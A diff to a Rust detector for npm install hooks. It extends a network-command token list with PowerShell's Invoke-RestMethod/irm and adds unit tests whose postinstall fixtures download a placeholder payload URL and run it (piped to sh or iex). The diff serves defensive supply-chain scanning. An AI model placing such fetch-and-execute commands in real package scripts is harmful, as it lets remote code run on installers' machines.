@@ -15,7 +15,14 @@ use crate::services::artifact_orchestration::{ArtifactLink, ArtifactOrchestrator
 
 use super::NPM_INSTALL_HOOKS;
 
-const INSTALL_HOOK_NETWORK_COMMAND_TOKENS: &[&str] = &["curl", "wget", "invoke-webrequest", "iwr"];
+const INSTALL_HOOK_NETWORK_COMMAND_TOKENS: &[&str] = &[
+    "curl",
+    "wget",
+    "invoke-webrequest",
+    "iwr",
+    "invoke-restmethod",
+    "irm",
+];
 const INSTALL_HOOK_EXEC_COMMAND_ARGS: &[(&str, &str)] = &[
     ("bash", "-c"),
     ("sh", "-c"),
@@ -556,6 +563,8 @@ mod tests {
             "/usr/bin/wget\t$PAYLOAD_URL -O payload.sh",
             "iwr\t$PAYLOAD_URL -OutFile payload.ps1",
             "iwr($PAYLOAD_URL) | iex",
+            "Invoke-RestMethod\t$PAYLOAD_URL | iex",
+            "irm($PAYLOAD_URL) | iex",
             "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"",
         ] {
             let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
@@ -589,6 +598,7 @@ mod tests {
         for command in [
             "mycurl\t$PAYLOAD_URL",
             "kiwr($PAYLOAD_URL) | iex",
+            "confirm($PAYLOAD_URL) | iex",
             "node -e \"require('child_process').exec('mycurl\t$PAYLOAD_URL')\"",
         ] {
             let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
@@ -627,6 +637,7 @@ mod tests {
         for command in [
             "curl\t$PAYLOAD_URL | sh",
             "iwr($PAYLOAD_URL) | iex",
+            "irm($PAYLOAD_URL) | iex",
             "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"",
         ] {
             let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
@@ -657,7 +668,11 @@ mod tests {
     /// Lookalike downloader command names must not invent Downloads edges.
     #[test]
     fn package_json_relations_rejects_download_command_substrings() {
-        for command in ["mycurl\t$PAYLOAD_URL", "kiwr($PAYLOAD_URL) | iex"] {
+        for command in [
+            "mycurl\t$PAYLOAD_URL",
+            "kiwr($PAYLOAD_URL) | iex",
+            "confirm($PAYLOAD_URL) | iex",
+        ] {
             let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
 
             let links = package_json_relations(&manifest);
@@ -680,6 +695,7 @@ mod tests {
         for command in [
             "curl\t$PAYLOAD_URL | sh",
             "iwr($PAYLOAD_URL) | iex",
+            "irm($PAYLOAD_URL) | iex",
             "node -e \"require('child_process').exec('curl\t$PAYLOAD_URL | sh')\"",
         ] {
             let manifest = format!(r#"{{"name":"x","scripts":{{"postinstall":{command:?}}}}}"#);
